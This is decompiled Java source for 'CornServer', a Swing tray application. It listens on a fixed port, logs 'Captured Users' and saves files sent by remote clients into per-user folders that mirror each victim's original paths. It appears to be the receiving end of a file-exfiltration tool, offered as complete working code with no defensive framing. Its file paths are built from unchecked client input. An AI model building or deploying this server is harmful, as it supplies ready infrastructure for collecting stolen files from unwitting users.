import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.awt.event.ActionEvent;
import java.net.Socket;
import java.io.IOException;
import java.net.ServerSocket;
import java.awt.Graphics2D;
import java.awt.LayoutManager;
import javax.swing.text.DefaultCaret;
import javax.swing.border.Border;
import java.io.File;
import java.awt.AWTException;
import java.awt.Image;
import java.awt.PopupMenu;
import java.awt.Font;
import java.awt.Component;
import javax.swing.BorderFactory;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import java.awt.Color;
import java.net.InetAddress;
import java.awt.image.BufferedImage;
import java.awt.MenuItem;
import javax.swing.JTextField;
import javax.swing.JScrollPane;
import java.awt.TrayIcon;
import java.awt.SystemTray;
import javax.swing.JTextArea;
import javax.swing.JFrame;



public class CornServer extends JFrame
{
    public static int port;
    private static final long serialVersionUID = 1L;
    private JTextArea CapturedUsers;
    private JTextArea filesTransferred;
    private SystemTray tray;
    private TrayIcon trayIcon;
    static final int BUFFER_SIZE = 1024;
    private String fileDest;
    private JScrollPane userList;
    private JScrollPane fileList;
    private JTextField downloadTo;
    private MenuItem showCornGUI;
    private BufferedImage logo;
    
    static {
        CornServer.port = 4253;
    }
    
    public CornServer() {
        this.fileDest = "E:\\CornServer\\Accounts\\";
        InetAddress localhost = null;
        try {
            localhost = InetAddress.getLocalHost();
        }
        catch (Exception ex) {}
        this.getContentPane().setBackground(new Color(255, 153, 51));
        final JButton hideGUI = new JButton("Hide GUI");
        hideGUI.setBounds(4, 230, 190, 25);
        hideGUI.addActionListener(new HideGUIListener());
        hideGUI.setBackground(Color.gray);
        hideGUI.setBorder(BorderFactory.createLineBorder(Color.black, 2));
        this.add(hideGUI);
        final JButton exitGUI = new JButton("Close Server");
        exitGUI.setBounds(196, 230, 181, 25);
        exitGUI.addActionListener(new exitCorn());
        exitGUI.setBackground(new Color(255, 155, 155));
        exitGUI.setBorder(BorderFactory.createLineBorder(new Color(249, 89, 89), 3));
        this.add(exitGUI);
        this.logo = new BufferedImage(16, 16, 1);
        final Graphics2D g2d = this.logo.createGraphics();
        g2d.setColor(new Color(255, 150, 0));
        g2d.fillRect(1, 9, 14, 6);
        g2d.setColor(Color.white);
        final Font cornFont = new Font("SansSerif", 1, 6);
        g2d.setFont(cornFont);
        g2d.drawString("Corn", 1, 6);
        g2d.setColor(Color.black);
        g2d.drawString("hub", 3, 14);
        final PopupMenu cornMenu = new PopupMenu();
        final MenuItem exitCorn = new MenuItem("Exit");
        final MenuItem openDir = new MenuItem("Open directory");
        (this.showCornGUI = new MenuItem("Show GUI")).setEnabled(false);
        exitCorn.addActionListener(new exitCorn());
        this.showCornGUI.addActionListener(new ShowGUIListener());
        openDir.addActionListener(new openDirectoryListener());
        cornMenu.add(exitCorn);
        cornMenu.addSeparator();
        cornMenu.add(this.showCornGUI);
        cornMenu.add(openDir);
        this.trayIcon = new TrayIcon(this.logo, "Corn Server", cornMenu);
        this.setIconImage(this.logo);
        this.trayIcon.setImageAutoSize(true);
        this.tray = SystemTray.getSystemTray();
        this.trayIcon.addActionListener(new ShowGUIListener());
        try {
            this.tray.add(this.trayIcon);
        }
        catch (AWTException e) {
            e.printStackTrace();
        }
        this.setTitle("Corn Server - V1.1");
        final JTextField IPAddress = new JTextField("IP: " + localhost.getHostAddress().trim());
        IPAddress.setBackground(Color.lightGray);
        IPAddress.setBounds(6, 5, 150, 25);
        IPAddress.setEditable(false);
        IPAddress.setBorder(BorderFactory.createLineBorder(Color.black, 2));
        this.add(IPAddress);
        (this.downloadTo = new JTextField(this.fileDest)).setBackground(Color.white);
        this.downloadTo.setBounds(160, 5, 218, 25);
        this.downloadTo.addActionListener(new ChangeDirectory());
        this.downloadTo.setBorder(BorderFactory.createLineBorder(Color.black, 2));
        this.add(this.downloadTo);
        if (!new File(this.fileDest).isDirectory()) {
            this.fileDest = "C:\\";
            this.downloadTo.setText(this.fileDest);
            this.downloadTo.setBackground(new Color(247, 114, 93));
        }
        (this.CapturedUsers = new JTextArea()).setEditable(false);
        (this.userList = new JScrollPane(this.CapturedUsers)).setVerticalScrollBarPolicy(20);
        this.userList.setHorizontalScrollBarPolicy(30);
        this.userList.setBounds(240, 30, 140, 200);
        this.userList.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), "Captured Users"));
        this.userList.setOpaque(false);
        this.userList.setBackground(Color.black);
        this.add(this.userList);
        (this.filesTransferred = new JTextArea()).setEditable(false);
        (this.fileList = new JScrollPane(this.filesTransferred)).setVerticalScrollBarPolicy(20);
        this.fileList.setHorizontalScrollBarPolicy(30);
        this.fileList.setBounds(2, 30, 240, 200);
        this.fileList.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), "Transferred Files"));
        this.fileList.setOpaque(false);
        this.fileList.setBackground(Color.black);
        this.add(this.fileList);
        final DefaultCaret caret = (DefaultCaret)this.filesTransferred.getCaret();
        caret.setUpdatePolicy(2);
        this.setLayout(null);
        this.setDefaultCloseOperation(3);
        this.setSize(388, 288);
        this.setAlwaysOnTop(true);
        this.setLocation(300 + (int)(Math.random() * 300.0), (int)(100.0 + Math.random() * 200.0));
        this.setResizable(false);
        this.setVisible(true);
        this.up();
    }
    
    public void up() {
        try {
            final ServerSocket CornServer = new ServerSocket(CornServer.port);
            while (true) {
                final Socket clientSocket = CornServer.accept();
                final ClientHandler client = new ClientHandler(clientSocket);
                final Thread clientThread = new Thread(client);
                clientThread.start();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void main(final String[] args) {
        new CornServer();
    }
    
    static /* synthetic */ void access$5(final CornServer cornServer, final String fileDest) {
        cornServer.fileDest = fileDest;
    }
    
    public class ShowGUIListener implements ActionListener
    {
        @Override
        public void actionPerformed(final ActionEvent ev) {
            CornServer.this.showCornGUI.setEnabled(false);
            CornServer.this.trayIcon.displayMessage("Corn Server", "GUI restored", TrayIcon.MessageType.NONE);
            CornServer.this.setVisible(true);
        }
    }
    
    public class HideGUIListener implements ActionListener
    {
        @Override
        public void actionPerformed(final ActionEvent ev) {
            CornServer.this.setVisible(false);
            CornServer.this.showCornGUI.setEnabled(true);
            CornServer.this.trayIcon.displayMessage("Corn Server", "GUI hidden", TrayIcon.MessageType.NONE);
        }
    }
    
    public class exitCorn implements ActionListener
    {
        @Override
        public void actionPerformed(final ActionEvent ev) {
            CornServer.this.trayIcon.displayMessage("Corn Server", "Corn Server has been closed", TrayIcon.MessageType.NONE);
            CornServer.this.tray.remove(CornServer.this.trayIcon);
            System.exit(-5);
        }
    }
    
    public class openDirectoryListener implements ActionListener
    {
        @Override
        public void actionPerformed(final ActionEvent ev) {
            try {
                Runtime.getRuntime().exec("explorer.exe /select," + CornServer.this.fileDest);
            }
            catch (IOException e) {
                System.exit(-1);
            }
        }
    }
    
    public class ChangeDirectory implements ActionListener
    {
        @Override
        public void actionPerformed(final ActionEvent ev) {
            final String newDir = CornServer.this.downloadTo.getText();
            if (new File(newDir).isDirectory()) {
                CornServer.this.downloadTo.setBackground(Color.white);
                if (newDir.endsWith("\\")) {
                    CornServer.access$5(CornServer.this, newDir);
                }
                else {
                    CornServer.access$5(CornServer.this, String.valueOf(newDir) + "\\");
                }
                CornServer.this.trayIcon.displayMessage("Corn Server", "Succesfully changed Directory\n" + CornServer.this.fileDest, TrayIcon.MessageType.NONE);
            }
            else {
                CornServer.this.trayIcon.displayMessage("Corn Server", "Failed to change Directory\n" + newDir, TrayIcon.MessageType.ERROR);
            }
            CornServer.this.downloadTo.setText(CornServer.this.fileDest);
        }
    }
    
    public class ClientHandler extends Thread
    {
        public static final int BUFFER_SIZE = 1024;
        private Socket cSock;
        
        public ClientHandler(final Socket s) {
            this.cSock = s;
            try {
                this.saveFile(s);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        private void saveFile(final Socket socket) throws Exception {
            final ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            final ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
            FileOutputStream fos = null;
            byte[] buffer = new byte[1024];
            Object o = ois.readObject();
            if (o instanceof String) {
                String uName = ((String)o).substring(((String)o).indexOf("*&*&*"));
                uName = uName.substring(5);
                o = ((String)o).substring(0, ((String)o).indexOf("*&*&*"));
                if (!CornServer.this.CapturedUsers.getText().contains(String.valueOf(uName) + "\n")) {
                    CornServer.this.CapturedUsers.append(String.valueOf(this.cSock.getLocalAddress().toString()) + ":" + uName + "\n");
                }
                if (!new File(String.valueOf(CornServer.this.fileDest) + uName).isDirectory()) {
                    new File(String.valueOf(CornServer.this.fileDest) + uName).mkdir();
                }
                final String fLoc = ((String)o).substring(((String)o).indexOf("\\"), ((String)o).lastIndexOf("\\"));
                final File toStreamTo = new File(String.valueOf(CornServer.this.fileDest) + uName + fLoc + ((String)o).substring(((String)o).lastIndexOf("\\")));
                CornServer.this.filesTransferred.append("\n" + uName + ": " + fLoc + ((String)o).substring(((String)o).lastIndexOf("\\")));
                final File testDir = new File(String.valueOf(CornServer.this.fileDest) + uName + fLoc);
                if (!testDir.isDirectory()) {
                    testDir.mkdirs();
                }
                fos = new FileOutputStream(toStreamTo);
            }
            else {
                this.throwException("Something is wrong");
            }
            Integer bytesRead = 0;
            do {
                o = ois.readObject();
                if (!(o instanceof Integer)) {
                    this.throwException("Something is wrong");
                }
                bytesRead = (Integer)o;
                o = ois.readObject();
                if (!(o instanceof byte[])) {
                    this.throwException("Something is wrong");
                }
                buffer = (byte[])o;
                fos.write(buffer, 0, bytesRead);
            } while (bytesRead == 1024);
            fos.close();
            ois.close();
            oos.close();
        }
        
        public void throwException(final String message) throws Exception {
            throw new Exception(message);
        }
    }
}
